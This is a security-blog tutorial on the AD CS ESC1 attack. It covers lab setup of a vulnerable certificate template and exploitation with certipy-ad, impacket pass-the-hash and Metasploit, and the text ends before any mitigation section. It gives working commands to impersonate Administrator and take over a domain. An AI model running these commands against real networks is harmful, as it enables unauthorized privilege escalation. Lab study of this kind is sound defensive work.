<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/active-directory-certificate-attack/" rel="category tag">Active Directory Certificate Attack</a></span>            </div>
            <h1 class="post-title entry-title">AD Certificate Exploitation: ESC1</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/ad-certificate-exploitation-esc1/" rel="bookmark"><time class="entry-date published" datetime="2025-04-06T16:51:04+00:00">April 6, 2025</time><time class="updated" datetime="2025-07-23T05:40:33+00:00">July 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>AD CS ESC1 Certificate Exploitation</strong> is a critical vulnerability in <strong>Active Directory Certificate Services</strong>. In this article, we will explores how misconfigured certificate templates can lead to privilege escalation. Additonally, we will cover various exploitation techniques.</span></p>
<p><span style="color: #000000;">The <strong>AD CS (Active Directory Certificate Services)</strong> certificate template is a predefined configuration in Microsoft AD CS that defines the type of certificate a user, computer, or service can request. It specifies parameters such as the intended purpose of the certificate, encryption algorithms, validity period, and whether it can be auto-enrolled.</span></p>
<p><span style="color: #000000;">These templates allow administrators to control the issuance and management of certificates within an organization’s Active Directory environment. AD CS uses these templates to standardize certificate issuance, thus making it easier to deploy secure certificates for users, computers, and services.</span></p>
<p><span style="color: #000000;">Some common types of certificate templates include:</span></p>
<ol>
<li><span style="color: #000000;"><strong>User Certificate</strong> – Used for authenticating users.</span></li>
<li><span style="color: #000000;"><strong>Computer Certificate</strong> – Used for authenticating computers.</span></li>
<li><span style="color: #000000;"><strong>Web Enrollment Certificate</strong> – Used for enrolling via the web.</span></li>
<li><span style="color: #000000;"><strong>Code Signing Certificate</strong> – Used to sign software or applications.</span></li>
</ol>
<h3><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li><span style="color: #000000;">Active Directory Certificate Services (AD CS) – Certificate Flow</span></li>
<li><span style="color: #000000;">Understanding Enrollment Right Misconfigurations</span></li>
<li><span style="color: #000000;">Prerequisites</span></li>
<li><span style="color: #000000;">Lab Setup</span></li>
</ul>
<p><strong><span style="color: #000000;">Enumeration &amp; Exploitation</span></strong></p>
<ul>
<li><span style="color: #000000;">Methods 1: Certipy-ad</span></li>
<li><span style="color: #000000;">Methods 2: Metasploit</span></li>
<li><span style="color: #000000;">Methods 3: certipy.exe</span></li>
</ul>
<p><strong><span style="color: #000000;">Mitigation Strategies</span></strong></p>
<h3><span style="color: #800000;">Active Directory Certificate Services (AD CS) – Certificate Flow</span></h3>
<p><span style="color: #000000;"><strong>Setup -&gt;</strong><strong> Request  -&gt;</strong><strong> Approval -&gt;</strong><strong> Use -&gt;</strong><strong> Renewal or Revocation -&gt;</strong><strong> Validity Check</strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6KxxjgYgYeQedgrsv9EY2wA_xpOlWJbqnJgdLyyXAfgFIT5mwjhtWpzB4SLUKWfVNN2bjlByvEAzBV9H8y5O2QaUuXe_WwVvptMVaufDcHlUeGP6vSKw9d5lQ_5EuN-UwW5e3gDt3SvWzAAzfFjIA7kx6cU65h3EI0NSG3bN0SIeofYw5iGiy8rMIh3St/s16000/0.png"/></strong></span></p>
<ol>
<li><span style="color: #000000;"><strong> Setup</strong></span></li>
</ol>
<p><span style="color: #000000;">Initially, the organization sets up a Certificate Authority (CA) – this acts like an official office that issues digital identity cards (certificates) to users and computers.</span></p>
<ol start="2">
<li><span style="color: #000000;"><strong> Request</strong></span></li>
</ol>
<p><span style="color: #000000;">A user or device asks the CA:</span></p>
<p><span style="color: #000000;">“<em>Please give me a certificate</em>.”</span></p>
<p><span style="color: #000000;">This can happen:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Automatically</strong> (via Group Policy for domain-joined systems)</span></li>
<li><span style="color: #000000;"><strong>Manually</strong> (using tools like MMC, certreq, or web enrollment)</span></li>
</ul>
<ol start="3">
<li><span style="color: #000000;"><strong> Approval</strong></span></li>
</ol>
<p><span style="color: #000000;">Next, the CA checks:</span></p>
<p><span style="color: #000000;"><em>“Is this a valid and authorized request?”</em></span></p>
<p><span style="color: #000000;">If yes, it <strong>signs</strong> the certificate (just like stamping and issuing an ID card) and sends it back to the requester.</span></p>
<ol start="4">
<li><span style="color: #000000;"><strong> Use</strong></span></li>
</ol>
<p><span style="color: #000000;">Once issued, the certificate is now used for secure purposes, such as:</span></p>
<ul>
<li><span style="color: #000000;">Logging into domain computers</span></li>
<li><span style="color: #000000;">Enabling HTTPS on web servers</span></li>
<li><span style="color: #000000;">Email encryption and signing</span></li>
<li><span style="color: #000000;">VPN and Wi-Fi authentication</span></li>
<li><span style="color: #000000;">IPsec communication</span></li>
</ul>
<ol start="5">
<li><span style="color: #000000;"><strong> Renewal or Revocation</strong></span></li>
</ol>
<ul>
<li><span style="color: #000000;"><strong>Renewal</strong>: Before a certificate expires, the system or user can request a new one.</span></li>
<li><span style="color: #000000;"><strong>Revocation</strong>: If the certificate is compromised or no longer needed, the CA can revoke (cancel) it.</span></li>
</ul>
<ol start="6">
<li><span style="color: #000000;"><strong> Validity Check</strong></span></li>
</ol>
<p><span style="color: #000000;">Other systems regularly check:</span></p>
<p><span style="color: #000000;"><em>“Is this certificate still valid and trusted?”</em></span></p>
<p><span style="color: #000000;">They look at:</span></p>
<ul>
<li><span style="color: #000000;"><strong>Certificate Revocation Lists (CRL)</strong></span></li>
<li><span style="color: #000000;"><strong>Online Certificate Status Protocol (OCSP)</strong></span></li>
</ul>
<p><span style="color: #000000;">to verify if the certificate is still good or has been revoked.</span></p>
<p><span style="color: #000000;">In this article, we will exploit misconfigured ADCS certificate template to request a certificate for any user, such as <strong data-start="3531" data-end="3548">Administrator</strong>, and use it for authentication</span></p>
<h3><span style="color: #800000;"> Understanding Enrollment Rights Misconfiguration</span></h3>
<p><span style="color: #000000;"> To begin with, Enrollment Rights Misconfiguration occurs when an Active Directory Certificate Services (AD CS) template has the following misconfigurations:</span></p>
<ul>
<li><span style="color: #000000;">ENROLLEE_SUPPLIES_SUBJECT → Allows users to specify their own Subject Alternative Name (SAN).</span></li>
<li><span style="color: #000000;">Any Purpose (EKU: 1.3.6.1.5.5.7.3.3) → Allows authentication with the certificate.</span></li>
<li><span style="color: #000000;">No Manager Approval Required → Directly issues certificates.</span></li>
<li><span style="color: #000000;">Accessible to Low-Privilege Users → Any domain user can request a certificate.</span></li>
</ul>
<p><span style="color: #000000;">Therefore, if any of these are seen this means, any authenticated user can request a certificate for another user like Administrator and then use that certificate for authentication and privilege escalation.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgHf2h7bHG4qLCkdF9I06T3mRu6aVf-SzDZVnTOvjOUrg_7vWoiQcQBthIDW-GafFTUvg7Zkxt4o7NwXVIRzix6L0Qgt3bfs4S_zurPRYO-U1V9dmVAXtJMCxFBOY4YRngxqtz5-zW5g06VWvBy9bw3w5ALV3iqP4G0CvAxgB1r0pt5Lzg2VpVrYrtdEECF/s16000/1.0.png"/></span></p>
<p><span style="color: #000000;">The image given below will help you to understand the type of policy that is used to certificate purpose. For example, here the given certificate is design for clients or user authentication.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgN9PAkeNGebX2P64Ty16cUgGwSXRv2WNzwN52YUA20I9rGcTsLA_pvJ7B6Q44Aym4YKTvwlTze6d4lyUriihfFLSMylFKL48823tLvcZOfYRPpj3_ZN5DL423_Hwf_hkDdlN6rqIb0NKUFy9wk8c6RrFcl0flJxGrs3NUxD4zxhaVuEV-6osbgmS9Vu1Qr/s16000/1.2.png"/></span></p>
<h3><span style="color: #800000;">Prerequisites</span></h3>
<ul>
<li><span style="color: #000000;">Windows Server 2019 as Active Directory that supports PKINIT</span></li>
<li><span style="color: #000000;">Domain must have Active Directory Certificate Services and Certificate Authority configured.</span></li>
<li><span style="color: #000000;">Kali Linux</span></li>
<li><span style="color: #000000;">Tools: Rubeus.exe, certify.exe, Impacket, certipy-ad, Metasploit</span></li>
</ul>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<p><span style="color: #000000;">To simulate the vulnerability in a practical environment, we will create a user named ‘aarti and add her to the <strong>Domain Users</strong> group, specifically to the <strong>IGNITEDomain Users</strong> group, where ‘aarti’ will be a member. This setup will demonstrate how attackers can exploit misconfigurations in an Active Directory Certificate Services (AD CS) template, specifically focusing on <strong data-start="2787" data-end="2826">AD CS ESC1 Certificate Exploitation</strong> to escalate privileges.<br/>
</span></p>
<h4><span style="color: #000000;">Create the AD Environment:</span></h4>
<p><span style="color: #000000;">To simulate an Active Directory environment, you will need a Windows Server configured as a Domain Controller (DC) and a controlled Active Directory lab that includes a vulnerable certificate template.</span></p>
<h4><span style="color: #000000;">Domain Controller &amp; AD CS Configuration:</span></h4>
<ul>
<li><span style="color: #000000;">Install Windows Server (2016 or 2019 recommended) that supports PKINIT.</span></li>
<li><span style="color: #000000;">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
<li><span style="color: #000000;">Set up the domain (e.g., <strong>Ignite</strong>).</span></li>
<li><span style="color: #000000;">The domain must have <strong>Active Directory Certificate Services (</strong><a style="color: #000000;" href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/"><strong>Read more</strong></a><strong>)</strong>and a <strong>Certificate Authority</strong></span></li>
</ul>
<h5><strong><span style="color: #000000;">Walkthrough: Creating a Vulnerable Certificate Template</span></strong></h5>
<p><span style="color: #000000;">Let’s have a walkthrough of the lab setup following with the Creation of a Vulnerable Certificate Template in AD CS we already discussed.</span></p>
<h5><span style="color: #000000;"><strong data-start="1036" data-end="1104">Step-by-Step: Configure the ESC1-Vulnerable Certificate Template</strong></span></h5>
<p><span style="color: #000000;">we will configure a misconfigured certificate template in Active Directory Certificate Services (AD CS) that allows for ESC1 exploitation. This involves duplicating an existing certificate template, enabling subject name supply, and setting permissions that make it vulnerable.</span></p>
<p><span style="color: #000000;"><strong>Open certsrv.msc</strong> (Certificate Authority) by using the run box in your windows AD CS</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEigIEnGczrbR6z-OrRxa9EFqedg31ERDoR8wfUZPLnDf8DMisr6G4tbxq2_fD4eDGu6Ws1vRoZkx8Fxdm-Nh2AZ8aBm1XWTV38dqgD-RWdMTHvHWH12BhSaZukDrcHrTr3cl2UQcKAzZi2YRHeSFw5eCpzRreBOyqqostCs_GkySw2iuPvHzQMwV_YDvN8E/s16000/1.png"/></span></p>
<p><span style="color: #000000;">Navigate to Certificate Templates → <strong>Manage</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjbF2T4lNa8TzjWm-8XlpZjChMr4GC6WEJqCc58AW7HHVh1agERaTopEr2mLQZySkYgicB7ouwfFGHXPJnp7Necx5ZyX9CTCNXKmDitIDt8oTOD3XkgKDLtNrVR2mA0M8hY9oDKP8Q160_aAVWuBZQPvsYW_I1Oz14yGT6Aw4l_yaNSRUB3QiB1GjeXVgyX/s16000/2.png"/></span></p>
<p><span style="color: #000000;">You will see the list of various certificate templates, Duplicate the code signing template by simply clicking duplicate template</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsosXhlGVC0EUDRpv1lNTItAXOHXB0kypQQbL-2Q-Hk1R3V0eQ8V9Bo55UD6Nt8dz5Qsx3bErDuYQZQ-BIQ2HNxLLDow9YeuBVKMrjt6YwoVarpf25OO2qVbikNqKA7xsfm80X0ygSAzSIVJzws0jdrQKTYbrRpkShr7ai_yxJMiAjWQsq-Kh1oBfOJpGe/s16000/3.png"/></span></p>
<p><span style="color: #000000;">Edit the properties of the new template Under the <strong>General tab</strong> where Change Template display name to something like Custom_ESC1.</span></p>
<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpKyKh5zz8gY3C6aS7GMKGx-DA0moh-iwWisl_jaBYhui_z7SFLboi1bVaDKArBQVcUILgNyZOxZLlQKVnLbde3BuHevicMkiSqEYR1Eq-yLB_IvOi8Q8EAFGNhmaYas2x-fcjd38We4i7sxdlooxgQ_6XAy4optZ4AU42s1pp8KTlSohn6sFcbaYSEC0M/s16000/4.png" alt="AD CS ESC1 Certificate Exploitation" width="595" height="837"/></span></p>
<p><span style="color: #000000;">Navigate to the <strong>Subject Name tab</strong> and Select “<strong>Supply in the request</strong>” → This is the key misconfiguration that allows attackers to request certificates for any user.</span></p>
<p><span style="color: #000000;"><em>Note: </em><em>Allowing users to manually specify the Subject Name when requesting a certificate enables attackers to request certificates for any username, including Administrator, and, when combined with ESC1 misconfigurations, facilitates privilege escalation.</em></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkZzQKZUZp7Gm5x-7Ko3ygf-t7kLSMAlwDDK8MOeGVBMAYq9fw2iMq5H40HdH4CoZKI3yn4kyTHdWKXVYI0LK2bFP3a_3sNDEWdUB9qZ5mw3qHsZadchiwo3YtwdrK7Yq8aKdUBL_gLLS_ma8ID3dSUCLfH-noElsDo4WPOfAuK267M36T7QDXHCmYiCsY/s16000/5.png"/></span></p>
<h5><strong>Modify Template Permissions</strong></h5>
<p><span style="color: #000000;">Modify Permissions (Access for All Users) navigate to the <strong>Security tab</strong> where you can see Authenticated Users or Click Add, then type Authenticated Users → Click OK to Select Authenticated Users.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3hfv-3KJDofaXJ36eIJTh-mCyqLBcCEq1wIcw6QhjOgEhFZAlnxfzdiQ0bwnAzqwwAkN-bLDX5BIaSiMtoX2xiT0YKLM-ikT4-tx-9XEJv10S5sAtdq4vdkEON0bA2DdvwuNJTM1JSnbHo5nNosjULmrW8VNEux9OApQMdlFC1q2OL3q9fst_dwfSlsXk/s16000/6.png" alt="AD CS ESC1 Certificate Exploitation" width="598" height="836"/></span></p>
<p><span style="color: #000000;">But in this case, we will modify the permissions for the <strong>Domain Users</strong> group. Click <strong>Add</strong>, type <strong>Domain Users</strong>, and then add it to the group.</span></p>
<p><span style="color: #000000;">Select <strong>Domain Users</strong> and check the following permissions: <strong>Enroll</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhw-vyXTyu77YgkApUxbiv3flz_d3DCvUWJH492n3751bDhOo5pUv_DRxIm5aiMzGiEJl4IcCUkVcic4hO2PP-gpn0J-n6I-mYpS-fUoqVj4zTzu284Ameo_Qx4XUhphZMkz-yJwjdGLGhUCVsEn-3_DIMI3gvRNCJQvwjFIjCiDMv3I9sEELSTGYSfkDkQ/s16000/7.png"/></span></p>
<h5><span style="color: #000000;"><strong data-start="1607" data-end="1638">Define Application Policies</strong></span></h5>
<p><span style="color: #000000;">Expend the property of Custom_ESC1 certificate and Navigate to the <strong>Extensions tab</strong> and Select “Application Policies” → This defines how a certificate can be used. </span></p>
<p><span style="color: #000000;">Click on Edit button</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgdb_jnm6ppKLjCeWz1lWZfilaMfhlZA1hkJpn3D4NKmG2QKF6xeEhQl38T7yW_LGCQb-PYumZ3aArhqWoasFkAk4zRSsoco9wpLNNsPiSCU1RXYBQao4c-FFC2TkSgOzdfmrjwfgNNmlvKalyphVlpeQ5dWfV-mBUb9Lg16-oyPKsAXtsSXsM5FYHajFK0/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Now select Add button under Application policies box</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjORLggvHUk6zTVQFB0GLRJJD5yoqFVo2pwVwsWvrGh-Np1ycB5XW1x3tfVrfXilPc0-M59RAgbNETemxP5BNRp6U1utoCGbvcb3ENwhHLTf310UIz2ELtIXr5bjZMVM5lxYVmKiuAmG95yn4QXrS0dTtCIaaBy43GDWUVh2SnVaSsQX-SjulzwwFkjiL88/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Here we are required to add the application policies, select Client Authentication and Click on ok.</span></p>
<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi-0JK-gFTYO7g_0cPomMlbynQ9l4XSJjhUPzXjgzmZchhKk7OWqUqQGr4hw57Xp8vzhQlZYXw69rEDEunv1yCoezEAOLQc0NFjh2CDFjoJy84qKDfuuRK3GgN1UlxMPE2YmbcFi9HIZnKle4X-bYhEw5Yusd5vxThrJJYRfTQuT2lST5wjFiL9jhTHV4ps/s16000/10.png" alt="AD CS ESC1 Certificate Exploitation" width="594" height="833"/></span></p>
<h5><span style="color: #000000;"><strong data-start="1864" data-end="1899">Publish the Vulnerable Template</strong></span></h5>
<p><span style="color: #000000;">Once the template is configured, we need to publish it to the Certificate.</span></p>
<p><span style="color: #000000;">Go back to the Certificate Authority (certsrv.msc) window. Right-click Certificate Templates → Click New → Certificate Template to Issue.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhumoBzDpIE1Gk4YrnCGVqhSeHnB7EI575-bMB6TYiZhbfYEb-ZKpsLxknvQPZHICVmoK2Adysf2ZGV0SFwn429xntDOzRkWNSYSKAKdChG1h2ogCqvU2JFpSydoocA7HvOXGwIFz9OmpgKGHv3rOxiMKeh84KBQnO5Oc-uu2NpWAi6d7BIvY00zXaykRSH/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Find Vulnerable Template in the list and select it in our case we created it as Custom_ESC1.</span></p>
<p><span style="color: #000000;">Click OK to publish it.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjhNr4JdSMMKo0vBA42GXcKhfRRafuUF0HDXyAWrEi1uV_j1exjB5HcphyMarDB9I2dc7f1s3wPQg0buOczRMaqsXO_iKl-ZPuPkI5tbZmjyUvHam-cL6P1Kn2YC1i_rVQA9PVzwhX0icGACwL-TmXMLBATVY5A0LZW8Gp24fqcuHFEGTx-C1mqRkGLSwEJ/s16000/12.png" alt="AD CS ESC1 Certificate Exploitation" width="872" height="556"/></span></p>
<h4><span style="color: #000000;">Why the ESC1 Template is Vulnerable</span></h4>
<p><span style="color: #000000;">At this point, it’s crucial to understand why this template is vulnerable. This is because we commence some misconfiguration as:</span></p>
<ul>
<li><span style="color: #000000;">Allowing Subject Alternative Name (SAN) Manipulation → Attackers can request a certificate as <a style="color: #000000;" href="mailto:Administrator@ignite.local">Administrator@ignite.local</a>,</span></li>
</ul>
<p><span style="color: #000000;"><strong><em>Note:</em></strong> <em>This issue occurs in Certificate Template Management (certtmpl.msc) under the “Request Handling” settings in the template. The mistake is that the “Supply in the request” option allows users to specify any Subject Alternative Name (SAN), enabling attackers to request certificates for Administrator, Domain Admins, or service accounts.</em></span></p>
<ul>
<li><span style="color: #000000;"><em> </em>Making Accessible to All Domain Users → Any domain user belonging to domain user group can enroll.</span></li>
</ul>
<p><span style="color: #000000;"><strong><em>Note:</em></strong> <em>This issue occurs when creating or modifying a certificate template in certsrv.msc or setting “Enrollment Permissions” in Active Directory Users &amp; Computers (ADUC). The mistake is allowing “Domain Users” group to enroll in the template or granting “Enroll” or “AutoEnroll” permissions to everyone in the group</em>.</span></p>
<ul>
<li><span style="color: #000000;">No Additional Approval Needed → No admin intervention is required to issue a certificate.</span></li>
</ul>
<p><span style="color: #000000;"><strong><em>Note:</em></strong> <em>This issue occurs in Certification Authority MMC (certsrv.msc) under “Certificate Template Properties.” The mistake is allowing certificates to be issued without manual approval, which enables attackers to request an Administrator certificate without triggering alerts.</em></span></p>
<p><span style="color: #000000;">This configuration makes the ESC1 attack possible, where a low-privileged user can request a certificate for a privileged account, authenticate using it, and escalate privileges.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration and Exploitation Methods</span> </span></h3>
<p><span style="color: #000000;">Once this template is configured, an attacker can use various tools to request an Administrator certificate, demonstrating <strong data-start="3888" data-end="3927">AD CS ESC1 Certificate Exploitation</strong>, and gain elevated access.</span></p>
<p><span style="color: #000000;">Now that the vulnerable certificate template (Custom_ESC1 or you may have set the another name of template) is configured, the next steps involve:</span></p>
<h4><span style="color: #800000;"><strong>Method 1 : Certipy-ad</strong></span></h4>
<p><span style="color: #000000;"><strong>Step 1: Enumerate Certificate Templates</strong></span></p>
<p><span style="color: #000000;">Before attacking, we must identify vulnerable certificate templates. For this we will use Linux tool name certipy-ad (Certipy-ad – it is a python tool for AD CS attacks)</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad find -u 'aarti@ignite.local' -p Password@1 -dc-ip 192.168.1.48 -vulnerable -enabled</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPoHZ7t1N7HS7lBQEyCAhGShyjGbVkW4xKku4rjTwVj8OoruWt3qaYyhpb-ut_pV4dgQhgma7QzWfRyXddk0ML87EZzgVJM1DHfseFYjZB4mojIEOHoQaMcW4PK-tEcciHqkjezO5_Q_qi_hFfAorY96IQ5GJ9jArbiNGkrZpPfY5sM28uwvqDt36qlH9X/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Now it’s time to look for the template that we saved just now and look for “Domain Users” with Enroll permissions. If Vulnerable Template appears in the results which is Custom_ESC1 in our case, move to the next step.</span></p>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhNRtB_rSWl82U9nYCPnBtXmLCAp4i_6DmAJzeoHJ4P2B1UEhtqiIwwYuJvF2DbxvH3fl2QrRFMlpiC6Dx4exeNm7CME73u2YH-MW14und-blwL-meVicLhA1-uxxUy6IqzdT_Kpn8EYOm11BPNvy_SDyhrSWieLO8zl0mVY4qly7763jhMj1B02vbs6qAz/s16000/14.png" alt="AD CS ESC1 Certificate Exploitation" width="632" height="900"/></span></p>
<p><span style="color: #000000;"><strong>Step 2: Request a Certificate as Administrator</strong></span></p>
<p><span style="color: #000000;">On Linux (using Certipy), you can run the following command:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad req -u 'aarti@ignite.local' -p 'Password@1' -dc-ip 192.168.1.48 -ca ignite-DC1-CA -target 'dc.ignite.local' -template 'Custom_ESC1' -upn 'administrator@ignite.local'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgJAUsihqKSBG7r3yMlY-kM1sbcuB1yhhABhmK1DNJF2AMtsdcWsDEFkZXwoylvTspDLOqacvmrZC2RMRwOoelRg5T2rCogjVYEEtPZ0RrC0BpupuVpdjIlZwwhGTBtRZVXWVudqqSa_COGqy2oXSruFyTYXohiL_IE98PobUxdz3dR-UYn7XwoU-4NpesO/s16000/15.png"/></span></p>
<p><span style="color: #000000;">If successful, an authentication certificate will be generated</span></p>
<p><span style="color: #000000;"><strong>Step 3: Authenticating as Administrator</strong></span></p>
<p><span style="color: #000000;">Now its time to authenticate with given certificate as an administrator by launching simple command as</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.48</pre>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8kNuNrMO8SvmhyeNxfwvDszq04mTkjUdjb1K_EwxrdYlonwEttXPb5EjEE10ohcd9NNNvu9V-P9YcJcKmaXwRDE1lDsKhgOkoutTm95dqAww0bBdSRV2AhguWNXeMRkRIg1UxX1Nnu-HR5Qbs5_75TXtsYvk6kr3iTfDYpCfYP_I8pD7C1maoVo9UFfYf/s16000/16.png" alt="AD CS ESC1 Certificate Exploitation" width="1507" height="276"/></span></p>
<p><span style="color: #000000;"><strong>Step 4: Dump NTLM Hashes for Post Exploitation</strong></span></p>
<p><span style="color: #000000;">Once authenticated as Administrator, dump NTLM hashes from the Domain Controller</span></p>
<p><span style="color: #000000;"><strong>Step 5: Lateral Movement &amp; Privilege Escalation</strong></span></p>
<p><span style="color: #000000;">After obtaining NTLM hashes, move laterally using Pass-the-Hash (PTH) attacks.</span></p>
<p><span style="color: #000000;">For this using an amazing tool impacket with the command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec ignite.local/administrator@ignite.local -hashes aad3b435b51404eeaad3b435b51404ee:64fbae31cc352fc26af97cbdef151e03</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilpb51teICqIyXUq-NuRAgoHhipznQLKsGqiUo-RrYsbH7fHbqzsdApRU8gr4vlEf9sl7APC1BQbXpwd9tzPD_6L_Tiq5uq1zj8_RvjrZBKb7VIQI79Jexd7rZ3us-hkFE2Z-D3gIfuFUphdVI5ZjMQpOxgDA-mlpINzDjJZgEIOPk2fkd5iXyWtllYnom/s16000/17.png"/></strong></span></p>
<h4><span style="color: #800000;"><strong>Method 2 : Metasploit</strong></span></h4>
<p><span style="color: #000000;"><strong>Metasploit</strong>, a powerful penetration testing framework, can automate ESC1 exploitation by:</span></p>
<p><span style="color: #000000;"><strong>Step 1: Enumerating AD CS misconfigurations</strong></span></p>
<p><span style="color: #000000;">Before attacking, enumerate certificate templates to check for misconfigurations. Metasploit’s ldap_esc_vulnerable_cert_finder automates the process of finding misconfigured certificate templates that allow privilege escalation.</span></p>
<p><span style="color: #000000;">Start Metasploit and load the LDAP enumeration module.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole
use auxiliary/gather/ldap/ldap_esc_vulnerable_cert_finder
set RHOSTS 192.168.1.48
set DOMAIN ignite.local
set USERNAME aarti
set PASSWORD Password@1
run</pre>
<ul>
<li><span style="color: #000000;">The RHOSTS is the Domain Controller’s IP address.</span></li>
<li><span style="color: #000000;">The DOMAIN is the target Active Directory domain</span></li>
<li><span style="color: #000000;">The USERNAME &amp; PASSWORD are for a low-privileged AD user.</span></li>
</ul>
<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIKSaqlB2u_Xy7f4mUbzSBpgaFmXB6NitWZ8Z0qrtsHDOAhK7G8o6OeK0VfM0gh-8DIhXxJ1i9OEnkiFlTVCvQE1AlDVDkj0QsTtWAKq8mph3QBHYh1-2R2jYhDEbctKgmuRQrc3x5FPKCXMj7JB7LNMv18gsSBJLXipf1p6XprTm-A9FrSpuQBwHvAT0T/s16000/18.png" alt="AD CS ESC1 Certificate Exploitation" width="1211" height="778"/></span></p>
<p><span style="color: #000000;">The module will check misconfigured certificate templates.</span></p>
<p><span style="color: #000000;">Look for:”Domain Users” can enroll</span></p>
<p><span style="color: #000000;">Once a vulnerable template is found, we can request a certificate as Administrator.</span></p>
<p><span style="color: #000000;"><strong>Step 2: Requesting certificates for privilege escalation</strong></span></p>
<p><span style="color: #000000;"> Load the Certificate Request Module</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/dcerpc/icpr_cert
set rhosts 192.168.1.48
set smbuser aarti
set smbpass Password@1
set CA ignite-DC1-CA
set cert_template Custom_ESC1
set smbdomain ignite.local
run</pre>
